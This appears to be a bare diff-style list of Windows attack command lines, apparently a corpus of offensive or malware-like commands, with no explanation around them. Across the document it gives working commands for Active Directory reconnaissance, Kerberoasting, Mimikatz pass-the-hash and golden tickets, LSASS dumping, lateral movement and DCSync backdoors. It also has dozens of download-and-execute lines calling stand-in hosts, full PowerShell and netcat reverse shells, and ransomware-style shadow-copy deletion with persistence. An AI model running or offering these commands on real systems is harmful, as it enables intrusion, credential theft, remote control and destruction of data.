+powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier
+powershell Get-DomainObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights
+powershell Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
+powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Admins"} | select ObjectDN,ActiveDirectoryRights
+powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+powershell Get-AppLockerPolicy -Domain -LDAP "LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},CN=Policies,CN=System,DC=targetdomain,DC=com"  | select -expandproperty RuleCollections
+powershell Get-AppLockerPolicy -Domain -LDAP "LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},CN=Policies,CN=System,DC=targetdomain,DC=com"  | select -expandproperty RuleCollections
+powershell Get-DomainComputer -identity LAPS-COMPUTER -properties ms-Mcs-AdmPwd
+powershell Find-LocalAdminAccess
+powershell Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }
+powershell Get-DomainUser -SPN | select name,serviceprincipalname
+powershell Get-DomainUser -PreauthNotRequired | select name
+powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+powershell Get-DomainComputer -Unconstrained
+powershell Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
+powershell Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
+powershell Invoke-BloodHound -CollectionMethod All,GPOLocalGroup
+powershell Invoke-BloodHound -CollectionMethod LoggedOn
+powershell SharpHound.ps1
+SharpHound.exe
+powershell Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"
+powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"
+powershell Invoke-Mimikatz -Command '"kerberos::list /export"'
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
+powershell Invoke-TokenManipulation -Enumerate
+powershell Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
+powershell Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
+.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt
+.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt
+.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
+sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe
+kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+mimikatz.exe
+schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dc.targetdomain.com /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"
+schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s 10.10.10.10 /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"
+schtasks /RUN /TN "shell" /s dc.targetdomain.com
+schtasks /RUN /TN "shell" /s 10.10.10.10
+powershell Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist "powershell.exe -e $encodedCommand"
+powershell Invoke-WmiMethod win32_process -ComputerName 10.10.10.10 -name create -argumentlist "powershell.exe -e $encodedCommand"
+powershell $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN/targetuser', $SecPassword)
+powershell Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname}
+powershell Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser
+powershell $sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com
+powershell Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination "C:\Users\public\"
+.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com
+.\MS-RPRN.exe \\dc.targetdomain.com \\10.10.10.10
+.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
+.\Rubeus.exe asktgt /user:svc_with_delegation /domain:10.10.10.10 /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
+kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi
+kerberos::golden /domain:10.10.10.10 /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Microsoft LEGITIMATE Hotfix" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c start calc.exe" --GPOName "Totally Legit GPO"
+powershell Add-ObjectACL -TargetDistinguishedName "dc=targetdomain,dc=com" -PrincipalSamAccountName BackdoorUser -Rights DCSync
+powershell Set-RemotePSRemoting -UserName BackdoorUser -ComputerName dc.targetdomain.com
+powershell Set-RemoteWMI -UserName BackdoorUser -ComputerName dc.targetdomain.com -namespace 'root\cimv2'
+powershell Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
+.\procdump.exe -r -ma lsass.exe lsass.dmp
+.\procdump.exe -r -ma firefox.exe firefox.dmp
+.\procdumpx86.exe -r -ma firefox.exe firefox.dmp
+.\procdumpx64.exe -r -ma firefox.exe firefox.dmp
+reg.exe save hklm\security c:\users\public\downloads\security.save
+wmic shadowcopy call create Volume='C:\'
+.\chisel.exe client 192.168.49.67:80 R:socks
+.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>
+. .\SharpHound.ps1
+powershell Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
+powershell Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess
+mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
+mimikatz sekurlsa::minidump c:\temp\lsass.dmp
+powershell Invoke-Mimikatz -Command '"kerberos::list /export"'
+powershell Invoke-Kerberoast
+powershell Get-NetUser -SPN
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
+vssadmin list shadows
+diskshadow list shadows all
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
+powershell Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
+whoami /all
+.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002
+.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002 -c '{CLSID}'
+.\RoguePotato.exe -r 10.10.14.9 -e "cmd.exe /c ping 10.10.14.9" -l 9999
+powershell powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1
+\.Watson.exe
+powershell Invoke-WebRequest -OutFile index.html -Uri https://superuser.com
+powershell Invoke-WebRequest -OutFile index.html -Uri https://11.10.10.1
+powershell iwr -outf index.html https://11.101.0.1
+bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
+bitsadmin /transfer myDownloadJob /download /priority normal http://11.10.10.10/10mb.zip c:\10mb.zip
+bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10/10mb.zip c:\10mb.zip
+certutil.exe -urlcache -split -f "https://10.10.10.10/files/PSTools.zip" pstools.zip
+certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+certutil.exe -urlcache -split -f "https://11.11.11.11/files/PSTools.zip" pstools.zip
+call bitsDownloader.bat "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+call bitsDownloader.bat "https://10.10.10.10/files/PSTools.zip" pstools.zip
+call bitsDownloader.bat "https://11.11.11.11/files/PSTools.zip" pstools.zip
+call winhhtpjs.bat "https://example.com/files/some.zip" -saveTo "c:\somezip.zip"
+call winhhtpjs.bat "https://10.10.10.10/files/some.zip" -saveTo "c:\somezip.zip"
+call winhhtpjs.bat "https://11.11.11.11/files/some.zip" -saveTo "c:\somezip.zip"
+call XMLHTTPDownloadJS.bat "https://download.sysinternals.com/files/PSTools.zip pst2.zip" pstools.zip
+call XMLHTTPDownloadJS.bat "https://10.10.10.10/files/PSTools.zip pst2.zip" pstools.zip
+call XMLHTTPDownloadJS.bat "https://11.11.11.11/files/PSTools.zip pst2.zip" pstools.zip
+call webclientDownload.bat "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+call webclientDownload.bat "https://10.10.10.10/files/PSTools.zip" pstools.zip
+call webclientDownload.bat "https://11.11.11.11/files/PSTools.zip" pstools.zip
+powershell $client = New-Object -TypeName System.Net.Http.Httpclient
+powershell [io.file]::WriteAllBytes($file, $task.Result.Content.ReadAsByteArrayAsync().Result)
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/payload.ps1')|iex"
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://11.11.11.11/payload.ps1')|iex"
+cmd.exe /k < \\webdavserver\folder\batchfile.txt
+cmd.exe /k < \\11.11.11.11\folder\batchfile.txt
+cmd.exe /k < \\10.10.10.10\folder\batchfile.txt
+cscript //E:jscript \\webdavserver\folder\payload.txt
+cscript //E:jscript \\10.10.10.10\folder\payload.txt
+cscript //E:jscript \\11.11.11.11\folder\payload.txt
+mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
+mshta vbscript:Close(Execute("GetObject(""script:http://10.10.10.10/payload.sct"")"))
+mshta vbscript:Close(Execute("GetObject(""script:http://11.11.11.11/payload.sct"")"))
+mshta http://11.11.11.11/payload.hta
+mshta http://10.10.10.10/payload.hta
+mshta http://webserver/payload.hta
+cscript.exe //E:jscript \\webdavserver\folder\payload.txt
+cscript.exe //E:jscript \\10.10.10.10\folder\payload.txt
+cscript.exe //E:jscript \\11.11.11.11\folder\payload.txt
+mshta.exe vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
+mshta.exe vbscript:Close(Execute("GetObject(""script:http://10.10.10.10/payload.sct"")"))
+mshta.exe vbscript:Close(Execute("GetObject(""script:http://11.11.11.11/payload.sct"")"))
+mshta.exe http://11.11.11.11/payload.hta
+mshta.exe http://10.10.10.10/payload.hta
+mshta.exe http://webserver/payload.hta
+rundll32 \\webdavserver\folder\payload.dll,entrypoint
+rundll32 \\19.19.19.19\folder\payload.dll,entrypoint
+rundll32 \\10.10.10.10\folder\payload.dll,entrypoint
+rundll32.exe \\webdavserver\folder\payload.dll,entrypoint
+rundll32.exe \\19.19.19.19\folder\payload.dll,entrypoint
+rundll32.exe \\10.10.10.10\folder\payload.dll,entrypoint
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://10.10.10.10/payload.sct");window.close();
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://11.11.11.11/payload.sct");window.close();
+wmic os get /format:"https://webserver/payload.xsl"
+wmic os get /format:"https://10.10.10.10/payload.xsl"
+wmic os get /format:"https://11.11.11.11/payload.xsl"
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\11.11.11.11\folder\payload.dll
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\10.10.10.10\folder\payload.dll
+regasm /u \\webdavserver\folder\payload.dll
+regasm /u \\11.11.11.11\folder\payload.dll
+regasm /u \\10.10.10.10\folder\payload.dll
+regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
+regsvr32 /u /n /s /i:http://10.10.10.10/payload.sct scrobj.dll
+regsvr32 /u /n /s /i:http://11.11.11.11/payload.sct scrobj.dll
+odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
+odbcconf /s /a {regsvr \\10.10.10.10\folder\payload_dll.txt}
+odbcconf /s /a {regsvr \\11.11.11.11\folder\payload_dll.txt}
+cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
+cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\10.10.10.10\folder\payload.xml > payload.xml & !MB! payload.xml"
+cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\11.11.11.11\folder\payload.xml > payload.xml & !MB! payload.xml"
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
+certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
+certutil -urlcache -split -f http://11.11.11.11/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
+certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
+certutil -urlcache -split -f http://11.11.11.11/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
+powershell $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+powershell $client = New-Object System.Net.Sockets.TCPClient("11.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+powershell $client = New-Object System.Net.Sockets.TCPClient("merelelu.ana",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+desktopimgdownldr /lockscreenurl:https://10.10.10.10.com:8080/file.ext /eventName:randomname
+desktopimgdownldr /lockscreenurl:https://11.11.11.11.com:8080/file.ext /eventName:randomname
+desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.ext /eventName:randomname
+WinHttp.WinHttpRequest.5.1;$h.open('POST','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
+powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('POST','http://11.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
+powershell (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1",
+telnet hostname.domain.com 80
+telnet 10.10.10.10 80
+telnet 11.11.11.11 80
+nc -l -p 6790
+nc.exe 192.168.100.113 4444 -e cmd.exe
+nc.exe 193.168.100.113 4444 -e cmd.exe
+nc.exe -lnvp 8080
+nc.exe 192.168.100.113 4444
+nc.exe 193.168.100.113 4444
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+C:\Windows\System32\cmd.exe /c vssadmin delete shadows /all /quiet
+C:\Windows\System32\cmd.exe /c wmic shadowcopy delete
+C:\Windows\System32\WScript.exe C:\Users\admin\enYXval36C\38oDr5.vbs
+C:\Windows\System32\Rundll32.exe 8ivq.dll arzy949
+C:\Windows\System32\cmd.exe /c ping 127.0.0.1 && reg add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v enYXval36C /t REG SZ /d C:\enYXval36CenYXval36C\enYXval36C.vbs /f
+C:\Windows\System32\mshta.exe ransom.hta
+C:\Windows\SysWOW64\Rundll32.exe {64F97CDC...FAB40CA\}.db #1 #1}
+C:\Windows\System32\cmd.exe /c (ping localhost >> nul & del $path\grey3.exe >> nul)
